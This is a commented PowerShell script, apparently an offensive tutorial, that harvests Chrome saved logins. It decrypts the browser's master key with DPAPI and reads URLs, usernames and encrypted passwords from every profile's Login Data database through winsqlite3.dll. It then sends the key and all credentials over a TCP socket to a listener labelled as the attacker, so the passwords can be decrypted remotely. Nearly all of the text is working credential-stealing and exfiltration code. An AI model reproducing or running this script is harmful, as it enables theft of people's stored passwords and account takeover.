# Now browser credentials can be a little bit
# tricky, but there is a way to successfully
# extract credentials.
#
# There is a couple things to note about
# chromium based browsers.
#
# They save the login info including URLs,
# usernames, and encrypted passwords. These
# passwords are encrypted with a key that is
# stored in the browser's local state file.
#
# With that being known, these are what we need
# to accomplish:
#
# 1. Locate the Local State file, parse through
#    it, grab and format the encryption key.
#
# 2. Locate a Profile directory, parse through
#    it, grab and save the URLs, usernames, and
#    encrypted passwords.
#
# Because we do not have the means to decrypt the
# passwords here, we will send the master key and
# the encrypted passwords over, and we will
# decrypt them from the attackers side.

# System.Security is not automatically imported,
# and we need it for Unprotect() for passwords.

Add-Type -AssemblyName System.Security

# The Login Data files use SQLite to manage the
# data. PowerShell doesn't have SQLite parsing
# capabilities, so we will build our own from The
# native windows winsqlite3.dll

# The things we will need from the dll to extract
# our data is: Open, Prepare, Step, and a way to
# convert bytes of a column.

Add-Type @"
using System;
using System.Runtime.InteropServices;

public class WinSQLite3
{
    [DllImport("winsqlite3.dll")]
    public static extern IntPtr sqlite3_open([MarshalAs(UnmanagedType.LPStr)] string filename, out IntPtr db);

    [DllImport("winsqlite3.dll")]
    public static extern IntPtr sqlite3_prepare16_v2(IntPtr db, [MarshalAs(UnmanagedType.LPWStr)] string sql, int numBytes, out IntPtr stmt, IntPtr pzTail);

    [DllImport("winsqlite3.dll")]
    public static extern IntPtr sqlite3_step(IntPtr stmt);

    [DllImport("winsqlite3.dll")]
    static extern int sqlite3_column_bytes(IntPtr stmt, int index);

    [DllImport("winsqlite3.dll")]
    static extern IntPtr sqlite3_column_blob(IntPtr stmt, int index);

    public static byte[] ColumnByteArray(IntPtr stmt, int index)
    {
        int length                      = sqlite3_column_bytes(stmt, index);
        byte[] result                   = new byte[length];

        if (length > 0)
        {
            Marshal.Copy(sqlite3_column_blob(stmt, index), result, 0, length);
        }
        
        return result;
    }
}
"@

# We want a way to quickly parse and grab the
# encryption key used for a specific browser.

# Note: Local State files are in json format.

function Retreive-EncryptionKey ($LocalStateFile)
{
    $LocalStateData                     = [IO.File]::ReadAllText($LocalStateFile)
    $JsonFormat                         = ConvertFrom-Json $LocalStateData
    $EncodedKey                         = $JsonFormat.os_crypt.encrypted_key

    # We have the raw key, but still need to
    # format and unprotect it.

    $DecodedKeyUnformatted              = [Convert]::FromBase64String($EncodedKey)
    $DecodedKey                         = $DecodedKeyUnformatted[5..($DecodedKeyUnformatted.Length - 1)]
    $Key                                = [Security.Cryptography.ProtectedData]::Unprotect($DecodedKey, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)

    return $Key
}

# Now for the easiest part. For a given browser,
# grab the encryption key, and every profile
# under this browser.

$UserDataFilePath                       = "$HOME\AppData\Local\Google\Chrome\User Data"
$LocalStateFile                         = "$UserDataFilePath\Local State"

$EncryptionKey                          = Retreive-EncryptionKey $LocalStateFile

$Profiles                               = Get-ChildItem $UserDataFilePath -Filter "Profile*"
$Default                                = Get-ChildItem $UserDataFilePath -Filter "Default*"
$AllProfiles                            = $Profiles + $Default

# This will be the SQL query used to grab our
# credentials.

$CredentialQuery                        = "SELECT origin_url, username_value, password_value FROM logins"

$Credentials                            = @()

# Now we go through every Login Data file in
# every profile, and extract the information.

foreach ($Profile in $AllProfiles.FullName)
{
    $LoginData                          = "$Profile\Login Data"

    # Open the database.

    $DataBaseHandle                     = 0
    [WinSQLite3]::sqlite3_open($LoginData, [Ref] $DataBaseHandle) > $Null

    # Begin querying.

    $Statement                          = 0
    [WinSQLite3]::sqlite3_prepare16_v2($DataBaseHandle, $CredentialQuery, -1, [Ref] $Statement, [IntPtr] 0) > $Null

    while([WinSQLite3]::sqlite3_step($Statement) -eq 100)
    {
        $Credentials                   += [PSCustomObject] @{
            URL                         = [WinSQLite3]::ColumnByteArray($Statement, 0)
            Username                    = [WinSQLite3]::ColumnByteArray($Statement, 1)
            EncryptedPassword           = [WinSQLite3]::ColumnByteArray($Statement, 2)
        }
    }
}

# I want to be able to copy and paste anything
# sent over a network stream, and I found this
# to be the easiest.

$Attacker                               = [Net.Sockets.TcpClient]::New("127.0.0.1", 4444)
$Stream                                 = $Attacker.GetStream()
$Writer                                 = [IO.StreamWriter]::New($Stream)
$Writer.AutoFlush                       = 1

# Send over the encryption key.

$Base64EncodedEncryptionKey             = [Convert]::ToBase64String($EncryptionKey)
$Writer.WriteLine($Base64EncodedEncryptionKey)

# Send over each credential.

foreach ($Credential in $Credentials)
{
    $Writer.WriteLine("-")

    $StringURL                          = [Text.Encoding]::UTF8.GetString($Credential.Url)
    $StringUsername                     = [Text.Encoding]::UTF8.GetString($Credential.Username)
    $EncodedEncryptedPassword           = [Convert]::ToBase64String($Credential.EncryptedPassword)

    $Writer.WriteLine($StringURL)
    $Writer.WriteLine($StringUsername)
    $Writer.WriteLine($EncodedEncryptedPassword)
}

$Attacker.Close()
